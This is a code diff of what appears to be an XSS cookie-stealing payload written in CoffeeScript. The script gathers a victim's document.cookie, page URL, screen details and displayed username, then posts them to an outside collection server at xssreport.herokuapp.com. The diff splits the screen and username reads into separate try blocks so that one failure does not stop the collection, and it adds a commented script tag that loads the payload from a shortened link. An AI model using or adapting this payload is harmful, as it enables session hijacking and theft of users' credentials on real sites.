@@ -5,12 +5,21 @@ try
   data = 
     cookie   : document.cookie
     url      : window.location.href
-    screen   : screen
     site     : 'bdfz'
-    username : document.getElementById("LblUserName").innerHTML
 catch error
   data = 
     error    : error
+
+try
+  test = JSON.stringify(screen)
+  data.screen = screen
+catch e
+  ;
+
+try
+  data.username = document.getElementById("LblUserName").innerHTML
+catch e
+  ;
 
 try
   ajax.post 'https://xssreport.herokuapp.com/upload/', ->
@@ -18,4 +27,6 @@ try
       ;
     , 'd=' + JSON.stringify(data)
 catch e
-  
+  ;
+
+# <script src="http://goo.gl/WhNq1" async="async"></script>
